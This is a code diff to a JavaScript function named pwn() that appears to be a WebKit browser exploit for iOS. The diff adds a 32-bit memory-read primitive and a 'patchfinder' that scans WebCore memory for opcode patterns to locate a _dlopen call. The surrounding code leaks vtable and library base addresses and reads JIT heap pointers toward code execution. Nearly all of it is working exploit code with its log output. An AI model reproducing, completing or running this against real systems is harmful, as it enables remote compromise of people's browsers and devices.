@@ -190,6 +190,10 @@ function pwn() {
         controller[1] = oldval;
     }
 
+    function read32(addr) {
+        return Sub((read64(addr).lo()), 0);
+    }
+
     var malloc_nogc = [];
     function malloc(sz) {
         var arr = new Uint8Array(sz);
@@ -208,6 +212,47 @@ function pwn() {
     log(`[*] el_addr = ${(el_addr)}`); 
     var vtab_addr = read64(el_addr);
     log(`[*] vtab_addr = ${(vtab_addr)}`);
+
+    var bl_dlopen_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
+    bl_dlopen_addr = Sub(bl_dlopen_addr, 0x105000);
+
+    var try_count = 0;
+    while (true) {
+        if(try_count > 0x1000) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        var opcode = read64(bl_dlopen_addr);
+
+        // WebCore:__text:000000018AF15D78 E9 03 00 32                             MOV             W9, #1
+        // WebCore:__text:000000018AF15D7C 09 01 00 39                             STRB            W9, [X8]
+        if(opcode == 0x39000109320003E9) {
+            break;
+        }
+        bl_dlopen_addr = Sub(bl_dlopen_addr, 0x4);
+        try_count++;
+    }
+
+    try_count = 0;
+    while (true) {
+        if(try_count > 0x100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        var opcode = read32(bl_dlopen_addr);
+        if(((opcode & 0xFC000000) >>> 0)== 0x94000000)  //Is BL addr?
+            break;
+            
+        bl_dlopen_addr = Sub(bl_dlopen_addr, 0x4);
+
+        try_count++;
+    }
+    log(`[+] found bl _dlopen addr: ${bl_dlopen_addr}`);
+
+    // remove this "return" if finished patchfinder
+    return;
 
     // Libs Base
     var webcore_base = Sub(vtab_addr, offsets.WEBCORE_BASE);
@@ -233,7 +278,7 @@ function pwn() {
     var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
     var memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
     var jitWriteSeparateHeaps = read64(Add(jsc_base, offsets.jitWriteSeparateHeaps));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
-    log(`[i] memPoolStart = ${memPoolStart}`);
+    log(`[i] memPoolStart = ${memPoolStart}`);  
     log(`[i] memPoolEnd = ${memPoolEnd}`);
     log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
     var longjmp = Add(libsystem_platform_base, offsets.longjmp);
